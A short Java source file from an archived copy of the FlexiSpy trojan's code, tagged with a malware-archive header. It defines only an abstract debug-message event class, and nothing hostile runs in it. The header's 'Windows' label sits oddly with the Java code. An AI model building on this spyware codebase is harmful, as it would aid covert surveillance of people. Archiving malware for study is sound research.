/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.event;

public abstract class DebugMessageEvent extends PEvent {

	public abstract DebugMode getMode();
	public abstract int getFieldCount();
	
	public EventType getEventType() {
		return EventType.DEBUG;
	}	
}
